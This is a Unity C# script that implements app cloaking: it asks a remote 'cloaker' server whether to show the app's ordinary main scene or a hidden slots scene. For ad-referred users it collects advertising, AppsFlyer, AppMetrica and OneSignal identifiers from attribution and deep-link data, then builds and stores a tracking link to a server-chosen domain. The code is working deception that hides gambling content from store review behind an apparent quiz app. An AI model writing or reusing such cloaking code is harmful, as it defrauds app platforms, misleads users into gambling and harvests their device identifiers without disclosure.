using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Web;
using AppsFlyerSDK;
using Facebook.Unity;
using Newtonsoft.Json;
using Ugi.PlayInstallReferrerPlugin;
using UnityEditor;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.Serialization;

public class DataFetcher : MonoBehaviour
{
    [SerializeField] private AppsFlyerObjectScript _appsFlyer;
    private SceneLoader _sceneLoader;
    public string cloUrl;
    private string _jsonCloResponse;

    private const string IsUserKey = "IsUser";
    //private const string JsonResponseKey = "JsonInfo";
    public const string TrackLinkKey = "track_link";

    private IEnumerator _cloRequestEnumerator;
    private string _appIdentifier;

    private void Awake()
    {
        _appIdentifier = Application.identifier;
        _sceneLoader = FindObjectOfType<SceneLoader>();
    }

    private void Start()
    {
        if(HasStatusInfo())
        {
            //готовая ссылка
           WorkWithStatusInfo();
        }
        else
        {
            FetchData();
        }
    }

    #region StatusInfo
    private void WorkWithStatusInfo()
    {
        var allowed = GetStatusInfo().allowed;
        if (!allowed)
        {
            _sceneLoader.LoadMainScene();
        }
        else
        {
            OneSignal.SetSubscription(false);
            Screen.orientation = ScreenOrientation.Landscape;
            _sceneLoader.LoadSlotsScene();
        }
    }

    private void SaveStatusInfo(CloData cloInfo)
    {
        if (cloInfo == null) return;

        PlayerPrefs.SetInt(IsUserKey, BoolToInt(cloInfo.user));
        PlayerPrefs.Save();
    }

    private bool HasStatusInfo()
    {
        return PlayerPrefs.HasKey(IsUserKey);
    }

    private StatusInfo GetStatusInfo()
    {
        var allowed = IntToBool(PlayerPrefs.GetInt(IsUserKey));
        return new StatusInfo {allowed = allowed};
    }

    private class StatusInfo
    {
        public bool allowed;
    }

    #endregion

    #region CloRequest
    private CloData SerializeCloData(string cloResponse)
    {
        if (string.IsNullOrEmpty(cloResponse)) return new CloData {user = false};

        // try catch, return null if exception
        
        return JsonUtility.FromJson<CloData>(cloResponse);
    }

    private void FetchData()
    {
        var cloDataCallback = new Action<CloData>(cloData =>
        {
            var preSave = new Action(delegate
            {
                SaveStatusInfo(cloData);
                WorkWithStatusInfo();
            });

            if (cloData.deeplink)
            {
                // Если клоака запрашивает проверку диплинка – проверяем
                RequestTrackLinkDataFromDeepLink(deepLinkData =>
                {
                    // Если есть диплинк – генерируем ссылку
                    if (deepLinkData != null)
                    {
                        GenerateLink(cloData, deepLinkData, preSave);
                        return;
                    }

                    // Иначе переходим к неймингу
                    CheckNamingOrCreateOrganicData(cloData, preSave);
                });
            }
            else
            {
                // Иначе переходим к неймингу
                CheckNamingOrCreateOrganicData(cloData, preSave);
            }
        });
     
        _cloRequestEnumerator = RequestCloData(cloDataCallback);
        StartCoroutine(_cloRequestEnumerator);
    }

    private IEnumerator RequestCloData(Action<CloData> cloDataCallback)
    {
        //запрашиваем ответ клоаки
        var webRequest = UnityWebRequest.Get(cloUrl);
        // Request and wait for the desired page.
        yield return webRequest.SendWebRequest();

        if (webRequest.isNetworkError || webRequest.isHttpError)
        {
            cloDataCallback(null);
            yield break;
        }

        string cloResponse = webRequest.downloadHandler.text;

        var cloData = SerializeCloData(cloResponse);
        cloData.user = true;
        
        cloDataCallback(cloData);
    }
    #endregion

    #region Naming
    private void CheckNamingOrCreateOrganicData(CloData cloData, Action namingOrOrganicDataCallback)
    {
        if (cloData.naming)
        {
            RequestTrackLinkDataFromNaming(cloData.media_sources.ToList(), namingData =>
            {
                if (namingData != null)
                {
                    GenerateLink(cloData, namingData, namingOrOrganicDataCallback);
                    return;
                }

                if (cloData.organic?.org_status == true)
                {
                    GenerateOrganicData(cloData, namingOrOrganicDataCallback);
                }
                else
                {
                    cloData.user = false;
                    UnityMainThreadDispatcher.Instance().Enqueue(SaveTrackLink("none", namingOrOrganicDataCallback));
                }
            });
        }
        else
        {
            if (cloData.organic?.org_status == true)
            {
                GenerateOrganicData(cloData, namingOrOrganicDataCallback);
            }
            else
            {
                cloData.user = false;
                UnityMainThreadDispatcher.Instance().Enqueue(SaveTrackLink("none", namingOrOrganicDataCallback));
            }
        }
    }

    private void GenerateOrganicData(CloData cloData, Action generateOrganicDataCallback)
    {
        Debug.Log("Generating organic");
        var organicData = new TrackLinkData
        {
            key = cloData.organic?.org_key ?? "none",
            sub1 = cloData.organic?.sub1 ?? "none",
            sub2 = cloData.organic?.sub2 ?? "none",
            sub3 = cloData.organic?.sub3 ?? "none",
            source = "none"
        };
        GenerateLink(cloData, organicData, generateOrganicDataCallback);
    }

    private void RequestTrackLinkDataFromNaming(List<MediaSource> mediaSources, Action<TrackLinkData> trackLinkCallback)
    {
#if UNITY_EDITOR
        trackLinkCallback(null);
        return;
#endif
        /*string conversionDataString =
            "{\"adgroup_id\":\"23846550730850736\",\"retargeting_conversion_type\":\"none\",\"is_fb\":true,\"is_first_launch\":true,\"iscache\":false,\"click_time\":\"2020-12-15 12:41:02.000\",\"match_type\":\"srn\",\"adset\":\"\u041d\u043e\u0432\u0438\u0439 \u043d\u0430\u0431\u0456\u0440 \u0440\u0435\u043a\u043b\u0430\u043c\u0438\",\"af_channel\":\"Instagram\",\"is_paid\":true,\"campaign_id\":\"23846550730830736\",\"install_time\":\"2020-12-15 12:43:03.773\",\"media_source\":\"Facebook Ads\",\"af_status\":\"Non-organic\",\"ad_id\":\"23846550768000736\",\"adset_id\":\"23846550730840736\",\"campaign\":\"c4i9lsnv02nii93ue86e:AZli1tw10rozh\",\"is_mobile_data_terms_signed\":true,\"adgroup\":\"\u041d\u043e\u0432\u0430 \u0440\u0435\u043a\u043b\u0430\u043c\u0430\"}";
        var conversionData = JsonConvert.DeserializeObject<Dictionary<string, object>>(conversionDataString);*/
        // TODO convert JSON string to Map<String, String>and use as test value
        _appsFlyer.GetConversionData((conversionData) =>
        {
            Debug.Log("Checking naming.");

            if (GetTrackLink() != null) return;               
            
            Debug.Log("No track link.");

            if (conversionData.ContainsKey("media_source"))
            {
                if (mediaSources != null)
                {
                    foreach (var source in mediaSources)
                    {
                        if ((string) conversionData["media_source"] == source.media_source)
                        {
                            string key;
                            if (source.key.split)
                            {
                                var position = conversionData[source.key.name].ToString().Split(source.key.delimiter.ToCharArray()[0])
                                    .GetValue(source.key.position);
                                key = (position ?? "none") as string;
                            }
                            else
                            {
                                key = (conversionData[source.key.name] == null
                                    ? "none"
                                    : conversionData[source.key.name]) as string;
                            }

                            string sub1;
                            if (source.sub1.split)
                            {
                                var position = conversionData[source.sub1.name].ToString().Split(source.sub1.delimiter.ToCharArray()[0])
                                    .GetValue(source.sub1.position);
                                sub1 = (position ?? "none") as string;
                            }
                            else
                            {
                                sub1 = (conversionData[source.sub1.name] == null
                                    ? "none"
                                    : conversionData[source.sub1.name]) as string;
                            }

                            string sub2;
                            if (source.sub2.split)
                            {
                                var position = conversionData[source.sub2.name].ToString().Split(source.sub2.delimiter.ToCharArray()[0])
                                    .GetValue(source.sub2.position);
                                sub2 = (position ?? "none") as string;
                            }
                            else
                            {
                                sub2 = (conversionData[source.sub2.name] == null
                                    ? "none"
                                    : conversionData[source.sub2.name]) as string;
                            }

                            string sub3;
                            if (source.sub3.split)
                            {
                                var position = conversionData[source.sub3.name].ToString().Split(source.sub3.delimiter.ToCharArray()[0])
                                    .GetValue(source.sub3.position);
                                sub3 = (position ?? "none") as string;
                            }
                            else
                            {
                                sub3 = (conversionData[source.sub3.name] == null
                                    ? "none"
                                    : conversionData[source.sub3.name]) as string;
                            }

                            var tracklink = new TrackLinkData
                            {
                                key = key,
                                sub1 = sub1,
                                sub2 = sub2,
                                sub3 = sub3,
                                source = source.source
                            };

                            trackLinkCallback(tracklink);
                            return;
                        }
                    }

                    trackLinkCallback(null);
                }
                else
                {
                    Debug.Log("Naming is not found");
                    trackLinkCallback(null);
                }
            }
            else
            {
                trackLinkCallback(null);
            }
        });
    }

    private string GetTrackLink()
    {
        return PlayerPrefs.HasKey(TrackLinkKey) ? PlayerPrefs.GetString(TrackLinkKey) : null;
    }
    #endregion

    #region Deeplink
    private void RequestTrackLinkDataFromDeepLink(Action<TrackLinkData> trackLinkCallback)
    {
        FB.Mobile.FetchDeferredAppLinkData(appLinkResult =>
        {
            if (appLinkResult?.TargetUrl == null)
            {
                Debug.Log("Deep link not found");
                trackLinkCallback(null);
            }
            else
            {
                try
                {
                    var deepLink = appLinkResult.TargetUrl.Split('?')[1];
                    //var deepLink = "gbquiz://link?key=key&sub1=sub1&sub2=sub2&sub3=sub3".Split('?')[1];
                    
                    var query = HttpUtility.ParseQueryString(deepLink);
                    var key = query.Get("key") ?? "NoKey";
                    var sub1 = query.Get("sub1") ?? "NoSub1";
                    var sub2 = query.Get("sub2") ?? "NoSub2";
                    var sub3 = query.Get("sub3") ?? "NoSub3";

                    trackLinkCallback(new TrackLinkData {key = key, source = "fb", sub1 = sub1, sub2 = sub2, sub3 = sub3});
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                    trackLinkCallback(null);
                }
            } 
        });
    }

    private void GenerateLink(CloData cloData, TrackLinkData trackLinkData, Action linkGeneratedCallback)
    {
        Debug.Log("Generating link");
        //var linkEnumerator =
        RequestAdvertiserId(advertiserId =>
        {
            Debug.Log($"Advertiser id {advertiserId}");
            RequestAppMetricaDeviceId((metricaId) =>
            {
                Debug.Log($"Metrica id {metricaId}");
                var queryMap = new Dictionary<string, string>();

                queryMap["key"] = trackLinkData.key;

                if (!string.IsNullOrEmpty(trackLinkData.sub1))
                    queryMap["sub1"] = trackLinkData.sub1;
                if (!string.IsNullOrEmpty(trackLinkData.sub2))
                    queryMap["sub2"] = trackLinkData.sub2;
                if (!string.IsNullOrEmpty(trackLinkData.sub3))
                    queryMap["sub3"] = trackLinkData.sub3;

                var appsflyerId = AppsFlyer.getAppsFlyerId();
                if (string.IsNullOrEmpty(appsflyerId)) appsflyerId = "none";
                
                if (cloData.integration_version == "v1")
                {
                    var sub5 = $"{trackLinkData.source}:{advertiserId}:{appsflyerId}:{metricaId}";

                    queryMap["sub4"] = _appIdentifier;
                    queryMap["sub5"] = sub5;
                }
                else
                {
                    //Debug.Log(Application.identifier);
                    queryMap["bundle"] = _appIdentifier;
                    queryMap["metrica_id"] = metricaId;
                    queryMap["apps_id"] = appsflyerId;
                    queryMap["ifa"] = advertiserId;

                    try
                    {
                        var subscriptionOneSignalStatus = OneSignal.GetPermissionSubscriptionState();
                        queryMap["onesignal_id"] =
                            string.IsNullOrEmpty(subscriptionOneSignalStatus.subscriptionStatus.userId)
                                ? "none"
                                : subscriptionOneSignalStatus.subscriptionStatus.userId;
                    }
                    catch (Exception e)
                    {
                        Debug.LogException(e);
                    }

                    queryMap["source"] = trackLinkData.source;
                }

                var trackLink = $"https://{cloData.track_domain}/click.php";
                var index = 0;
                foreach (var pair in queryMap)
                {
                    trackLink += index == 0 ? "?" : "&";

                    trackLink += $"{pair.Key}={queryMap[pair.Key]}";
                    index++;
                }
                Debug.LogError(trackLink);

                UnityMainThreadDispatcher.Instance().Enqueue(SaveTrackLink(trackLink, linkGeneratedCallback));
            });
        });
    }

    private IEnumerator SaveTrackLink(string trackLink, Action saveCallback)
    {
        PlayerPrefs.SetString(TrackLinkKey, trackLink);
        PlayerPrefs.Save();
                
        Debug.Log(trackLink);

        saveCallback();
        yield return null;
    }

    private void RequestAppMetricaDeviceId(Action<string> metricaIdCallback)
    {
        // TODO same as for advertiser
#if UNITY_EDITOR
        metricaIdCallback("none");
        return;
        #else
        AppMetrica.Instance.RequestAppMetricaDeviceID((s, error) => {
            metricaIdCallback(s);
        });
#endif
    }

    private void RequestAdvertiserId(Action<string> advertiserIdCallback)
    {
#if UNITY_EDITOR
        advertiserIdCallback("none");
#endif
#if UNITY_ANDROID
        advertiserIdCallback(GetAdvertisingIdAndroid());
#else
        Application.RequestAdvertisingIdentifierAsync(
        (string advertisingId, bool trackingEnabled, string error) =>
            {
                if (string.IsNullOrEmpty(advertisingId))
                {
                    Debug.Log("advertisingId error :" + error);
                    advertiserIdCallback("none");
                }
                else
                {
                    Debug.Log("advertisingId :" + advertisingId);
                    advertiserIdCallback(advertisingId);
                }
                Debug.Log("end advertiser id");
            }
        );
#endif
    }

    private string GetAdvertisingIdAndroid()
    {
        AndroidJavaClass up = new AndroidJavaClass  ("com.unity3d.player.UnityPlayer");
        AndroidJavaObject currentActivity = up.GetStatic<AndroidJavaObject> ("currentActivity");
        AndroidJavaClass client = new AndroidJavaClass ("com.google.android.gms.ads.identifier.AdvertisingIdClient");
        AndroidJavaObject adInfo = client.CallStatic<AndroidJavaObject> ("getAdvertisingIdInfo",currentActivity);

        return adInfo.Call<string>("getId");
    }

    #endregion

    #region TODO
    private string GetInstallReferrer()
    {
        string referrer = null;
        PlayInstallReferrer.GetInstallReferrerInfo(installReferrerDetails =>
        {
            // check for error
            if (installReferrerDetails.Error != null)
            {
                Debug.LogError("Error occurred!");
                if (installReferrerDetails.Error.Exception != null)
                {
                    Debug.LogError("Exception message: " + installReferrerDetails.Error.Exception.Message);
                }

                Debug.LogError("Response code: " + installReferrerDetails.Error.ResponseCode);
                return;
            }

            referrer = installReferrerDetails.InstallReferrer;
        });

        return referrer;
    }

    #endregion

    #region PlayerPrefsBoolCast

    private int BoolToInt(bool val)
    {
        return val ? 1 : 0;
    }

    private bool IntToBool(int val)
    {
        return val != 0;
    }

    #endregion
}

[Serializable]
public class CloData
{
    public bool naming;
    public bool deeplink;
    public string integration_version;
    public string track_domain;
    public Organic organic;
    public bool user;
    public MediaSource[] media_sources;
}

public class TrackLinkData
{
    public string key;
    public string sub1;
    public string sub2;
    public string sub3;
    public string source;
}

[Serializable]
public class MediaSource
{
    public string source;
    public string media_source;
    public KeyOrSub key;
    public KeyOrSub sub1;
    public KeyOrSub sub2;
    public KeyOrSub sub3;
}
[Serializable]
public class KeyOrSub
{
    public string name;
    public bool split;
    public string delimiter;
    public int position;
}

[Serializable]
public class Organic
{
    public bool org_status;
    public string org_key;
    public string sub1;
    public string sub2;
    public string sub3;
}